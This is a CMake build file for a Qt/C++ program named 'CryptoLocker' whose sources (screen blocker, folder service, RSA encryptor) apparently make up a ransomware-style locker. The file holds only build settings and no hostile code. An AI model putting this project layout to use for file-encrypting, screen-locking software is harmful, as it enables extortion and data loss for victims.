cmake_minimum_required(VERSION 3.15)

#set vcpkg env variables! You don't need that if you have set those environment variables
#set(VCPKG_TARGET_TRIPLET x64-windows)

# Configure vcpkg
include(cmake/app_utils.cmake)
setup_vcpkg_before_project()

#setup the program language: c++ and some othe parameters
project(CryptoLocker LANGUAGES CXX)

set(CMAKE_AUTOUIC ON)
set(CMAKE_AUTOMOC ON)
set(CMAKE_AUTORCC ON)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# configure qt
find_package(QT NAMES Qt6 REQUIRED COMPONENTS Core Widgets)
find_package(Qt${QT_VERSION_MAJOR} REQUIRED COMPONENTS Core Widgets)

#configuration for Boost library
#set(Boost_USE_STATIC_LIBS ON)
#set(Boost_USE_STATIC_RUNTIME ON)
find_package(Boost REQUIRED COMPONENTS filesystem system)

#configuration for Boost library
find_package(cryptopp CONFIG REQUIRED)

add_executable(CryptoLocker
  main.cpp
  view/screenblocker.h
  view/screenblocker.cpp
  service/folderservice.cpp
  service/folderservice.h
  service/rsaencryptor.h
  service/rsaencryptor.cpp
)

target_link_libraries(CryptoLocker
    PRIVATE
        Qt${QT_VERSION_MAJOR}::Core
        Qt${QT_VERSION_MAJOR}::Widgets
        #${Boost_FILESYSTEM_LIBRARY}
        #${Boost_LIBRARIES}
        Boost::system
        Boost::filesystem
        cryptopp::cryptopp
)

install(TARGETS CryptoLocker
    LIBRARY DESTINATION ${CMAKE_INSTALL_LIBDIR})
